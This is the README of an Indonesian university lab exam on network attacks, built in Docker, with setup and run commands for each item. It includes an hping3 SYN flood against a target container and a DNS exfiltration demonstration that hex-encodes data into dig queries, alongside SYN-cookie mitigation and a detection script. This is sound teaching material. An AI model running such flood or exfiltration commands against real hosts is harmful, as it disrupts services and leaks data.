# UTS Praktik Infrastruktur & Network Attacks (Pertemuan 1–7)

Repositori ini berisi seluruh source lab untuk UTS praktik berbasis Docker: Dockerfile image khusus, file docker-compose, dan skrip pendukung untuk Bagian B dan studi kasus.

**Gunakan hanya di lingkungan lab lokal. Jangan memindai atau menyerang host di luar lab.**

## Struktur

```
images/uts-openssl/       Dockerfile image openssl (Soal B2)
images/uts-kali-tools/    Dockerfile image hping3, dnsutils, xxd, dsniff, aircrack-ng (Soal B3, B4, Kasus 3, 4, 6)
images/uts-dnsmasq/       Dockerfile image dnsmasq (Soal B4)
b/b1-compose/             docker-compose.yml Soal B1 (jaringan internal)
b/b3-syn-flood/           docker-compose.yml Soal B3 (SYN flood)
b/b4-dns-exfil/           docker-compose.yml Soal B4 (DNS exfiltration)
kasus/k5-scapy/           Skrip Scapy untuk Kasus 5
kasus/k9-dns-detect/      Skrip deteksi DNS exfiltration untuk Kasus 9
```

## Persiapan (sebelum ujian)

Jaringan Bagian B memakai `internal: true`, sehingga container di dalamnya tidak punya akses internet. Semua paket harus sudah terpasang di image.

```bash
docker build -t uts-openssl images/uts-openssl
docker build -t uts-kali-tools images/uts-kali-tools
docker build -t uts-dnsmasq images/uts-dnsmasq
docker pull alpine
docker pull nginx:alpine
docker pull vulnerables/web-dvwa
docker pull kalilinux/kali-rolling
```

## Bagian A (ringkas)

```bash
# A1
docker run -d --name web-uts -p 8080:80 nginx:alpine
curl -s http://localhost:8080
docker exec web-uts head -n 5 /etc/nginx/nginx.conf

# A2
docker volume create data-uts
docker run --name w1 -v data-uts:/data alpine sh -c 'echo NIM > /data/catatan.txt'
docker rm w1
docker run --rm -v data-uts:/data alpine cat /data/catatan.txt

# A3
echo 'pesan rahasia' > pesan.txt
md5sum pesan.txt; sha256sum pesan.txt
sed -i 's/pesan/pesaN/' pesan.txt
md5sum pesan.txt; sha256sum pesan.txt

# A4
openssl enc -aes-256-cbc -pbkdf2 -salt -in pesan.txt -out pesan.enc -pass pass:kunci123
openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:kunci123
openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:salah   # bad decrypt
openssl enc -aes-256-cbc -pbkdf2 -salt -a -in pesan.txt -pass pass:kunci123

# A5
docker network create lab-net
docker run -d --name host-a --network lab-net alpine sleep infinity
docker run -d --name host-b --network lab-net alpine sleep infinity
docker run -d --name dvwa --network lab-net vulnerables/web-dvwa
docker exec host-a ping -c 3 host-b
docker exec host-a wget -S -O /dev/null http://dvwa/login.php
```

## Bagian B

```bash
cd b/b1-compose && docker compose up -d
docker compose exec attacker wget -qO- http://target
docker compose down -v
```

Soal B2 (kriptografi) dijalankan di container `uts-openssl` (lihat perintah di kunci penguji dalam dokumen UTS).

```bash
cd b/b3-syn-flood && docker compose up -d
docker compose exec target netstat -ant | grep -c SYN_RECV
docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose exec target netstat -ant | grep -c SYN_RECV
docker compose exec target sysctl -w net.ipv4.tcp_syncookies=1
docker compose down -v
```

```bash
cd b/b4-dns-exfil && docker compose up -d
echo -n NIM-ANDA | xxd -p
docker compose exec attacker dig +short <hex>.exfil.lab @dns
docker compose logs dns | grep exfil.lab
echo <hex> | xxd -r -p
docker compose down -v
```

## Studi Kasus (perintah pendukung)

- Kasus 5: `docker run --rm -it --network lab-net -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-target>`
- Kasus 9: `python3 kasus/k9-dns-detect/analisis_dns.py dns.log`

Untuk Kasus 9, simpan log dengan `docker compose logs dns > dns.log`.

## Menentukan kasus per NIM

1. Jumlahkan seluruh digit NIM.
2. Hitung sisa bagi jumlah tersebut dengan 10.
3. Sisa 0 berarti Kasus 10. Selain itu, nomor kasus sama dengan sisa bagi.

Contoh NIM 19552011024: jumlah digit 30, 30 mod 10 = 0, maka Kasus 10.

Repositori ini tidak memuat jawaban mahasiswa. Setiap mahasiswa mengumpulkan jawabannya sendiri.
